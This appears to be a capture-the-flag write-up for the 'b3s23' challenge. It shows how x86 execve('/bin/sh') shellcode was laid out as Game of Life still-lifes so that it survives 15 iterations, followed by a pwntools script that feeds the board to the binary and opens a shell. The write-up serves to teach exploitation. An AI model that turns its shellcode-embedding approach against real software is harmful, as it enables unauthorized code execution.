# bs323

> Welcome to b3s23.  Enter x,y coordinates.  Enter any other character to run.

Basic interaction with the binary quickly indicates that the program interprets the input as the set of live cells on a Conway's Game of Life board. After some minor reverse engineering, we see that The board is stored as a 12100-bit array, in 110 rows of 110 bits each. The binary runs 15 iterations of Game of Life on the board, and then it jumps to the first byte of the board data structure. So we need to create a board that will have shellcode at the start of the board after the Game of Life iterations.

## Game of Life
Conway's Game of Life is a famous cellular automata game. The rules are simple. The game takes place on a square grid, and a set of cells is initially colored black, or alive. The rest of the cells are considered dead. The game proceeds in steps. Each turn, you count each cell's number of live neighbors. If a live cell has 0 or 1 neighbors, it dies (turns white) in the next step (underpopulation). If a live cell has 4 or more neighbors, it also dies in the next step (overpopulation). A dead cell with exactly three neighbors becomes alive (reproduction).

This block has the implementation of the basic Game of Life rules, first counting a cell's neighbors and then deciding whether to make it alive in the next step.

![Game of Life block]
(images/isgameoflife.png)

## Shellcode Evolution
Since the entire point of Game of Life is that the evolution is difficult to predict(in fact, it's capable of representing Turing-complete computation), we need to set up the board carefully so it will evolve predictably. The easiest way to do this is to place only static structures on the board. Game of Life enthusiasts have created catalogs of all the small static patterns, which are known as "still-lifes". See http://codercontest.com/mniemiec/p1.htm for one useful example.

Execution effectively occurs across the board's rows, so we can place the code without regard to its Game of Life evolution and then use the surrounding rows to make the executing row static. We'll have to use jumps to get from each executing row to the next.

## Shellcode Choice
The shortest approach is to put code that calls `read` with the board as the destination and then send the real shellcode. Unfortunately, we didn't think of this during the competition, so we just put standard shellcode (`execve("/bin/sh", {"/bin/sh, NULL"}, ))`) on the board.

## Still-life Construction
Constructing still-lifes containing arbitrary code is actually somewhat difficult. For example, we could not find a small still-life that we could place on the board to create a sequence of five or more consecutive one-bits (live cells). So we just avoided any instructions or data with that many ones in a row.

One useful primitive to decouple adjacent instructions is the instruction `add al, 0`, which is represented as `0x04 0x00` in machine code. This instruction allows you to separate any potentially problematic adjacent instructions, because essentially all the bits are off.

One other useful primitive to combine still-life patterns is that adjacent walls (vertical sequences of live cells) do not interfere, as long as they match. So the following arrangement of two still-life patterns (the snake and the block) works:
```
xx x xx
x xx xx
```

Of course, any patterns separated by a gap of two columns or two rows will not interfere as well.

## Board
Below, we have the board we used, with shellcode inline. Executing lines are marked as beginning with `>` characters and ending with `|` characters.

```
>xxx   x   xxxx  | JNO $+1Eh;
x   x x x  x  x                       x xx x xx x xx
 x  x x x                       >   xxx x xx x xx x  | JMP $+5A;
  x x xx                           x               xxx
   x                               xx                x 

PUSH $0; PUSH $68h; XOR EAX, EAX; OR AL, $2Fh; ADD AL, $0; JMP $+55h;                       x   x
   xx xx           xx xx                   x          xx   xx x  x                  x xx x x x x x 
>  xx x x          xx x x  xx x     xx   xxx          xx    x xxxx     x          xxx x xx x x x x|
      x x             x x  x xx     xx  x                   x         x x        x          x   x
      xx              xx                xx                 xx   xx     x         xx
                                                                xx

OR AH, $73h; PUSH AX; PUSH $0Bh; POP EAX; JMP $+56h;                              x   
                           x              x      xx xx                    x xx x x x xx
>       x       xx  xx   xxx  xx xx  xx  x x     xx x x     x xx x xx   xxx x xx x x xx |
       x x      xx  xx  x     xx xx  xx   x         x x     xx x xx x  x          x    
        x               xx                          xx                 xx         

PUSH $6E69626Fh; ADD AL, 0; PUSH ESP; POP EBX; JNO $+56h;
                                            xx     x                                  x   x
       xx xx   xx x  x xx  xx                x    x x          xx     xx xx xx x     x x x x xx
>      xx x     x xxxx xx   x  xx x  x xx xxx      x           x x x   x xx xx xxx   x x x x xx |
          x     x          x   x xx  xx x x                       xx   x          x   x   x
          xx   xx   xx xx  xx                                         xx         xx
                    xx xx                                                     
PUSH ESP; POP ECX; XOR EDX, EDX; PUSH EDX; PUSH EBX; PUSH ESP; POP ECX; INT $80h;
                                                                 x
     xx           xx  xx     x xx    xx  xx   x   xx xx      xx x x
>    x x x   x xx  x  xx   xxx x  x  x x  x  x x  xx x x x   x xx  x     x          xx  xx xx |
        xx   xx x x       x      xx     xx    x         xx        xx    x x         xx  xx xx
                 x        xx                                             x
```

## Script
The following Python code converted this board into the program input and ran the exploit:

```
import re
from pwn import *

f = open('board.txt')
s = f.read()

rows = s.split('\n')
coords = [[(a.start(),i) for a in re.finditer('x', rows[i])] for i in range(len(rows))]
flatcoords = reduce(lambda x,y: x+y, coords)

tube = process("./b3s23")

for (x,y) in flatcoords:
    tube.writeline('{},{}'.format(x,y))

tube.writeline('lol')

for i in range(15):
    tube.recvuntil('01110001000111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000')

tube.interactive()
```
